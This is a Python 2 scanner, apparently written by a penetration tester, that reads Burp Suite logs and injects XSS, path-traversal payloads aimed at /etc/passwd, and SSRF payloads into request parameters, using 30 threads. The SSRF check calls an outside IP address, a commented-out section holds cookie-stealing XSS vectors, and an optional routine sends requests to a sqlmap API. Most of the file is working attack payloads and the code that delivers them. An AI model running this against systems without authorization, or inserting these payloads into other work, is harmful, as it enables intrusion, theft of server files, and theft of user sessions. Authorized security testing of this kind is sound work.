#!/usr/bin/env python
#coding=utf-8

import threading
import random
import requests
import copy
import urlparse
import urllib
import json
import time
import sys
from AutoSqli import AutoSqli
import logging
from Queue import Queue
from colorama import *

"""
根据网络上的一些脚本，自己改了一下
现在是多线程，对于burpsuite的日志提取出GET方法来，
过滤出一些`txt`, `jpg`等图片，js，css，无关的请求
然后使用 host+path+sorted(请求参数名) 这一个字符串作为去重的条件
得到的结果分别将xss的payload插入到对应的位置上去
再去请求
v1版本，不保证稳定性，只操作GET型的XSS， payload可以自己添加
"""

requests.packages.urllib3.disable_warnings()
_random=str(random.randint(300,182222))
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s ^^^: %(message)s')
logging.getLogger("requests").setLevel(logging.WARNING)
lock = threading.Lock()
# XSS规则
XSS_Rule = {
    "script":[
        "`';!--\"<XSS>=&{()}",
        "&\"]}alert();{//"
        "<svg onload=alert(1)>",
        "../../../../../../../../../../etc/passwd",
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "..//..//..//..//..///etc/passwd",
        #"././././././././././././././././././././././././../../../../../../../../etc/passwd",
        #";alert(1)//"
        #"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        #"\"`'></textarea><audio/onloadstart=confirm`1` src>",
    ],
    # URL跳转与SSRF
    "redirect" : [
        'http://138.128.193.123/ssrf.txt', #  Valar Morghulis
    ],
}

# 文件包含规则

"""
# if not necessery, not use this rule, 
XSS_Rule = {
    "script":[
            "<script>alert('XSS');</script>",
            "<scr<script>ipt>alert("+_random+");</scr</script>ipt>",
            "\"><script>alert("+_random+")</script>",
            "<?='<SCRIPT>alert(\""+_random+"\")</SCRIPT>'?>",
            "<scrscriptipt>alert("+_random+")</scrscriptipt>",
            "</textarea>\'\"><script>alert(document.cookie)</script>",
            "</div><script>alert("+_random+")</script>",
            "'></select><script>alert("+_random+")</script>",
    ],
    "img":
    [
            "<img src=foo.png onerror=alert(/"+_random+"/) />",
            "<IMG SRC=\"jav&#x09;ascript:alert('"+_random+"');\">",
            "<IMG LOWSRC=\"javascript:alert('"+_random+"')\">",
            "<IMG SRC='vbscript:msgbox(\""+_random+"\")'>",
            ">\"><img src=\"javascript:alert('"+_random+"')\">",
            "\"/></a></><img src=1.gif onerror=alert("+_random+")>",
    ],
    "iframe":
    [
        "\"><iframe src='javascript:alert(document.cookie)'></iframe>",
    ],
    "event":
    [
        "\" onfous=alert(document.domain)\"><\"",
        "<SELECT NAME=\"\" onmouseover=alert("+_random+")></select>",
    ],
    "meta":
    [
        "<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert(/"+_random+"/');\">",
    ],
    "base":
    [
        "<BASE HREF=\"javascript:alert('"+_random+"');//\">",
    ],

}
"""

def getLinks(filename):
    # 得到url, headers->{"cookie", "Referer", "User-Agent"}
    result = {}
    no_repeat = set()
    DEBUG = True
    with open(filename, 'rb') as f:
        content=f.read()
        blocks = content.split("\r\n\r\n\r\n\r\n")
        for index, block in enumerate(blocks):
            
            tmp = block.split("\r\n")[3:-1]
            if (len(tmp) < 1):
                continue
            else:
                try:
                    _ = tmp[0].split(" ")[1]
                    if not checkType(_):
                        continue
                except:
                    return result
            path = ""
            host = ""
            headers = {"Cookie": "", "User-Agent": ""}
            for _ in tmp:
                if _.startswith("GET") or _.startswith("POST"):
                    # 以防格式不对，多出来一个请求头
                    if path == "":
                        path = _.split(" ")[1]
                    else:
                        break
                if _.startswith("Host"):
                    #print _.split(":")[1]
                    host = _.split(":")[1].strip()
                if _.startswith("User-Agent"):
                    headers["User-Agent"] = _.split(":")[1].strip()
                if _.startswith("Referer"):
                    headers["Referer"] = "".join(_.split(":")[1:]).strip()
                if _.startswith("Cookie"):
                    headers["Cookie"] = _.split(":")[1].strip()
                
            # 去重，利用域名，目录， 和参数的sort值来判断，如果相同就忽略
            # 否则就加入到no_repeat里
            url = "http://" + host + path
            if not checkRepeat(url, no_repeat):
                result[index] = {}
                result[index]["url"] = url
                result[index]["headers"] = headers
                if tmp[0].startswith("POST"):
                    result[index]["data"] = tmp[-1]
            else:
                continue
        print "The length: {0}".format(len(result))
        return result

def checkType(path):
    if path.split("?")[0].split(".")[-1] in (("f4v","bmp","bz2","css","doc","eot","flv","gif","gz","ico","jpeg","jpg","js","less","mp3", "mp4", "pdf","png","rar","rtf","swf","tar","tgz","txt","wav","woff","xml","zip")):
        return False
    else:
        return True

def checkRepeat(host, no_repeat=None):
    try:
        url_node = urlparse.urlparse(host)
        query_dict = urlparse.parse_qs(url_node.query)
        param = "".join(sorted(query_dict.keys()))
        host = url_node.netloc
        path = url_node.path
        # host + path + param 来判断是否存在
        tmp = host + path + param
        if tmp in no_repeat:
            return True
        else:
            no_repeat.add(tmp)
            return False
    except Exception as e:
        return True


def _init_get_url(url_group,rules,inqueue):

    for key in url_group.keys():
        # 一旦发现data,即post请求，那么就continue
        if "data" in url_group[key]:
            continue 
        _url_item = url_group[key]["url"]
        headers = url_group[key]["headers"]
        url_node = urlparse.urlparse(_url_item)
        uquery = url_node.query
        # 对于无参数的请求，直接将文件包含的payload放在路径后边
        if not uquery:
            for rule_item in rules.keys():
            # 添加属于ssrf/URL跳转的规则, 
                for _rule in rules[rule_item]:
                    if 'passwd' in _rule:
                        if not _url_item.endswith("/"):
                            _url_item = _url_item + "/"
                        inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'}) 
    
            continue
        url_parse = _url_item.replace('?'+uquery, '')
        query_dict = dict(urlparse.parse_qsl(uquery))

        for rule_item in rules.keys():
            for _rule in rules[rule_item]:
                for parameter_item in query_dict.keys():
                    tmp_dict = copy.deepcopy(query_dict)
                    tmp_dict[parameter_item] = _rule
                    tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
                    if 'ssrf' in _rule:
                        inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'ssrf'})
                    else:
                        inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'xss'})




class detectXSS(threading.Thread):
    """docstring for detectXSS"""
    def __init__(self, inqueue, outqueue):
        threading.Thread.__init__(self)
        self.inqueue =  inqueue
        self.outqueue = outqueue

    def run(self):
        while True:
            if self.inqueue.empty():
                break
            try:
                target = self.inqueue.get(timeout=3)
                if self.request_do(target['action'],None,target['regex'], target["headers"], target['type']):
                    logging.info(Fore.RED + "[*][GET] Find One Of XSS/LFI/SSRF/URL_Redirect: %s" % target['action'] + Style.RESET_ALL)
                    self.outqueue.put(target["action"])
                    lock.acquire()
                    with open("find_xss.txt", "a") as f:
                        f.write(target["action"] + "\n")
                    lock.release()
            except Exception as e:
                pass


    def request_do(self, url, _data, _regex, headers, type):
        TIMEOUT=5
        _bool = False
        if "Connection" in headers:
            if headers["Connection"] == "close":
                pass
            else:
                
                headers["Connection"] = "close"
        else:
            headers["Connection"] = "close"
        #if type == 'ssrf':
        #    logging.info("[-] Dealing type: {}".format(type))
        #logging.info("[-] Requesting " + url)
        try:
            if _data is not None:
                req = requests.post(url,data=_data,timeout=TIMEOUT, headers=headers, verify=False)
            else:
                # 如果ssrf或者URL跳转问题，那么允许其跳转
                if type == 'ssrf':
                    req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False, allow_redirects=True)
                    req_result = "".join(req.content.split('\n'))
                    if req_result.find('Valar Morghulis') != -1:
                        _bool=True
                        logging.info('[*] [ssrf/url redirect] FOUND!!')
                    return _bool
                   
                else:
                    req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False)
            if ("Content-Type" in req.headers) and (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
                return _bool
            req_result = ''.join(req.content.split('\n'))

            if "passwd" in _regex:
                if req_result.find('root:x:') != -1:
                    _bool=True
               
            elif req_result.find(_regex) != -1:
                _bool = True
        except Exception, e:
            logging.error("[!!] [request_do]\t" + str(e))
            return _bool
        return _bool

def autoSqli(dict_result):
    sqlmapapi = "http://10.110.28.13:8088"
    for index in dict_result.keys():
        target = dict_result[index]["url"]
        if "Cookie" in dict_result[index]["headers"]:
            cookie = dict_result[index]["headers"]["Cookie"]
        else:
            cookie = None

        if "data" in dict_result[index]:
            data = dict_result[index]["data"]
        else:
            data = None
        
        #print "-------" , data
        if "soaiymp3" in target:
            print target
        a = AutoSqli(sqlmapapi, target, data=data, cookie=cookie)
       
        a.createNewTask()
        a.optionSet()



if __name__ == '__main__':
    Usage = "python %s target_log" %(sys.argv[0])

    if len(sys.argv) != 2:
        print Usage
        sys.exit(0)
    filename = sys.argv[1]
    inqueue = Queue()
    outqueue = Queue()
    # 增加文件是否存在的校验
    dict_result = getLinks(filename)
    # 将action结尾的URL放入同一个URL，这样以后再出现struts漏洞时，就可以用的上了
    with open("action.lst", "a") as f:
        for i in dict_result.keys():
            _ = urlparse.urlparse(dict_result[i]["url"])
            if "action" in _.path or "do" in _.path:
                f.write(dict_result[i]["url"] + "\n")


    #print dict_result
    #with open("test.json", "w") as f:
    #    json.dump(dict_result.encode("utf-8"), f)
    # 对所有请求都POST到SQLMAPAPI中去
    #autoSqli(dict_result)
    #sys.exit(0)
    # XSS/LFI scan
    _init_get_url(dict_result, XSS_Rule, inqueue)
    logging.info("[-] Totally {0} requests".format(inqueue.qsize()))
    time.sleep(3)
    threads = []
    # 30个线程来跑
    for i in xrange(30):
        thd = detectXSS(inqueue, outqueue)
        #thd.setDaemon(True)
        threads.append(thd)

    for thd in threads:
        thd.start()
    
    for thd in threads:
        if thd.is_alive():
            thd.join()
    """
    count = 0
    # 最高30分钟?
    while True:
        for thd in threads:
            if thd.is_alive():
                time.sleep(1)
            else:
                count += 1
        if count == 30:
            break
    """

    # 输出outqueue的内容
    while not outqueue.empty():
        print "[+] [GET]:\t" + Fore.GREEN + outqueue.get() + Style.RESET_ALL

    print "[-][-] Done!"

